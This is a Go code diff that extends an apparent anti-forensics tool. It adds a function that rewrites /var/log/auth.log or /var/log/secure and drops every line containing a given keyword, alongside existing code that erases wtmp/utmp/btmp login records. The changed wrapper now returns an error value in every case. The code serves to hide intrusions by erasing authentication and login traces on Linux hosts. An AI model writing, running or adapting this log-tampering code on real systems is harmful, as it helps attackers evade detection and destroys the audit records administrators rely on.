@@ -9,7 +9,7 @@ import (
 
 // CleanAllByKeyword delete any entries containing keyword in ALL known log files
 func CleanAllByKeyword(keyword string) (err error) {
-	return deleteXtmpEntry(keyword)
+	return fmt.Errorf("deleteXtmpEntry: %v\ndeleteAuthEntry: %v", deleteXtmpEntry(keyword), deleteAuthEntry(keyword))
 }
 
 // deleteXtmpEntry delete a wtmp/utmp/btmp entry containing keyword
@@ -32,7 +32,7 @@ func deleteXtmpEntry(keyword string) (err error) {
 		// back up xtmp file
 		// err = ioutil.WriteFile(path+".bak", xmtpData, 0664)
 		// if err != nil {
-		// 	return fmt.Errorf("Failed to backup %s: %v", path, err)
+		//	return fmt.Errorf("Failed to backup %s: %v", path, err)
 		// }
 
 		for offset < len(xmtpData) {
@@ -75,4 +75,25 @@ func deleteXtmpEntry(keyword string) (err error) {
 		}
 	}
 	return err
+}
+
+// deleteAuthEntry clean up /var/log/auth or /var/log/secure
+func deleteAuthEntry(keyword string) (err error) {
+	path := "/var/log/auth.log"
+	logData, err := ioutil.ReadFile(path)
+	if err != nil {
+		path = "/var/log/secure"
+		logData, err = ioutil.ReadFile(path)
+		if err != nil {
+			return fmt.Errorf("No auth log found: %v", err)
+		}
+	}
+	lines := strings.Split(string(logData), "\n")
+	var new_content string
+	for _, line := range lines {
+		if !strings.Contains(line, keyword) {
+			new_content += line + "\n"
+		}
+	}
+	return ioutil.WriteFile(path, []byte(new_content), 0644)
 }
